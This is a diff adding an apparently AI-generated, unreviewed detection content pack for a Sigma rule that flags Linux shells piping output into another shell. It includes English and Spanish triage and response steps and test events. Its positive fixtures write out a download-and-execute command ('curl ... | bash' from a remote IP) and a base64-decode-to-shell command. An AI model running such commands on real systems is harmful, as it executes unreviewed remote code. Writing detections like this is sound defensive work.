@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "880973f3-9708-491c-a77b-2a35a1921158",
+    "title": "Linux Shell Pipe to Shell",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1140"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso se inició con 'sh -c' o 'bash -c' y su línea de comandos envía la salida a otro intérprete de shell. Suele indicar descarga y ejecución directa o decodificación de un payload ofuscado.",
+      "what_it_detects": "Procesos de Linux cuyo CommandLine empieza con 'sh -c ' o 'bash -c ' y que, dentro o al final, canalizan la salida a 'sh' o 'bash' (por ejemplo '| bash' o '|sh ').",
+      "why_it_matters": "Al canalizar a una shell, el código se ejecuta sin escribirse en disco y sin revisarse antes. Corresponde a ATT&CK T1140 (desofuscar o decodificar archivos o información), donde base64 u otra codificación oculta los comandos reales.",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique qué genera la salida canalizada (curl, wget, base64 -d, echo, xxd) y qué URL, dominio o cadena codificada aparece.",
+        "Si hay contenido codificado, decodifíquelo en un entorno aislado y revise los comandos resultantes sin ejecutarlos.",
+        "Revise ParentImage y la cadena de procesos padre: cron, servidor web, sshd, gestor de configuración o un servicio expuesto a Internet.",
+        "Identifique el usuario que ejecutó el proceso y confirme si su actividad es habitual en ese host.",
+        "Busque procesos hijos y conexiones de red del mismo host en una ventana de +/- 15 minutos: descargas, conexiones salientes, nuevos binarios en /tmp o /dev/shm.",
+        "Revise cambios de persistencia en esa ventana: crontab, systemd units, ~/.bashrc, authorized_keys.",
+        "Busque el mismo CommandLine, URL o IP de origen en otros hosts y alertas previas de la misma entidad."
+      ],
+      "false_positives": [
+        "Software legítimo que usa estos patrones, por ejemplo instaladores oficiales del tipo 'curl ... | bash' ejecutados por administradores.",
+        "Scripts de aprovisionamiento, Ansible, cloud-init o pipelines de CI/CD que generan y ejecutan comandos con una shell.",
+        "Herramientas internas de mantenimiento que generan comandos dinámicamente y los pasan a sh."
+      ],
+      "response_steps": [
+        "Verifique con el dueño del sistema o del usuario si la ejecución estaba autorizada y si la fuente descargada es confiable.",
+        "Si es malicioso, aísle el endpoint de la red y conserve la evidencia: memoria, listado de procesos, archivos descargados y su hash.",
+        "Bloquee las URL, dominios o IP involucrados en el proxy y el firewall.",
+        "Elimine la persistencia y los artefactos confirmados, y termine los procesos maliciosos tras documentarlos.",
+        "Rote las credenciales expuestas en el host y restaure desde una fuente confiable si se confirma un compromiso.",
+        "Documente las exclusiones legítimas con CommandLine y ParentImage exactos para reducir el ruido."
+      ],
+      "severity_rationale": "El nivel medium es adecuado porque el patrón es típico de ejecución de payloads, pero también lo usan instaladores y scripts administrativos legítimos."
+    },
+    "en": {
+      "summary": "A process started with 'sh -c' or 'bash -c' and its command line pipes output into another shell. This often means download-and-execute or decoding of an obfuscated payload.",
+      "what_it_detects": "Linux processes whose CommandLine starts with 'sh -c ' or 'bash -c ' and that pipe output into 'sh' or 'bash' somewhere inside or at the end, for example '| bash' or '|sh '.",
+      "why_it_matters": "Piping into a shell runs code without writing it to disk or reviewing it first. This maps to ATT&CK T1140 (Deobfuscate/Decode Files or Information), where base64 or other encoding hides the real commands.",
+      "triage_steps": [
+        "Read the full CommandLine: identify what produces the piped output (curl, wget, base64 -d, echo, xxd) and any URL, domain or encoded string.",
+        "If encoded content is present, decode it in an isolated environment and review the resulting commands without executing them.",
+        "Check ParentImage and the parent chain: cron, web server, sshd, configuration manager or an Internet-facing service.",
+        "Identify the executing user and confirm whether this activity is normal for them on this host.",
+        "Review child processes and network activity on the same host within +/- 15 minutes: downloads, outbound connections, new binaries in /tmp or /dev/shm.",
+        "Look for persistence changes in that window: crontab, systemd units, ~/.bashrc, authorized_keys.",
+        "Search other hosts for the same CommandLine, URL or source IP, and check earlier alerts for this host or user."
+      ],
+      "false_positives": [
+        "Legitimate software using these patterns, such as official 'curl ... | bash' installers run by administrators.",
+        "Provisioning scripts, Ansible, cloud-init or CI/CD pipelines that generate and run commands through a shell.",
+        "Internal maintenance tools that build commands dynamically and pass them to sh."
+      ],
+      "response_steps": [
+        "Confirm with the system or user owner whether the execution was authorized and whether the downloaded source is trusted.",
+        "If malicious, isolate the endpoint and preserve evidence: memory, process list, downloaded files and their hashes.",
+        "Block the involved URLs, domains or IPs at the proxy and firewall.",
+        "Remove confirmed persistence and artifacts, and terminate malicious processes after documenting them.",
+        "Rotate credentials exposed on the host and rebuild from a trusted source if compromise is confirmed.",
+        "Document legitimate exclusions using exact CommandLine and ParentImage values to reduce noise."
+      ],
+      "severity_rationale": "Medium fits because the pattern is typical of payload execution, but legitimate installers and admin scripts also use it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "bash -c downloads a script from a remote host and pipes it into bash (ends with '| bash').",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -c curl -fsSL http://203.0.113.10/install.sh | bash",
+          "ParentImage": "/usr/sbin/cron",
+          "User": "www-data",
+          "ProcessId": 48213,
+          "ParentProcessId": 48190,
+          "Computer": "web-02"
+        }
+      },
+      {
+        "description": "sh -c decodes a base64 string and pipes the result into sh (contains '| sh ').",
+        "event": {
+          "Image": "/usr/bin/dash",
+          "CommandLine": "sh -c echo ZWNobyBoZWxsbw== | base64 -d | sh -s",
+          "ParentImage": "/usr/sbin/apache2",
+          "User": "www-data",
+          "ProcessId": 51002,
+          "ParentProcessId": 50877,
+          "Computer": "web-02"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "bash -c pipes output into sha256sum; no pipe into a shell, so selection_exec does not match.",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -c tar -cf - /opt/app | sha256sum",
+          "ParentImage": "/usr/bin/python3",
+          "User": "deploy",
+          "ProcessId": 3021,
+          "ParentProcessId": 2988,
+          "Computer": "bastion-01"
+        }
+      },
+      {
+        "description": "bash -c with a grep pipeline used by a log rotation script; no shell at the end of the pipe.",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -c cat /var/log/syslog | grep -i error",
+          "ParentImage": "/usr/sbin/cron",
+          "User": "root",
+          "ProcessId": 7710,
+          "ParentProcessId": 7702,
+          "Computer": "bastion-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:12+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
